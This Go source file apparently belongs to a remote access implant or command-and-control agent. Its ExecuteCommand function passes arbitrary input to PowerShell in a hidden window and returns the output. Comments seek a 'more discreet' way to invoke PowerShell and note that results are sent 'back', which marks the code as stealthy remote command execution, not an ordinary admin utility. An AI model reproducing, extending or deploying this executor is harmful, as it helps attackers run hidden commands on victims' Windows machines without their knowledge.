package cmd

import (
	"fmt"
	"os"
	"os/exec"
	"strings"
	"syscall"
)


func ExecuteCommand(input string, opts *CliOptions) (string, error) {

    if strings.HasPrefix(input, "ls") || strings.HasPrefix(input, "dir") {
        toExec := strings.SplitN(input, " ", 2)
        args, _ := os.Getwd()
        if len(toExec) == 2 {
            args = toExec[1]
        }

        if opts.DebugEnabled {
            fmt.Printf("[+] Executing ls with dirpath: %s\n", args)
        }

        return ExecLs(args)
    }

    if opts.DebugEnabled {
        fmt.Printf("[+] Executing powershell.exe with dirpath: %s\n", input)
    }

    /* TODO: improve the call to powershell to something more discreet ? */
    cmd := exec.Command("powershell", input)
    cmd.SysProcAttr = &syscall.SysProcAttr{
        HideWindow: true,
    }

    /* retrieve output or error & send it back! */
    out, err := cmd.CombinedOutput()
    return string(out), err
}
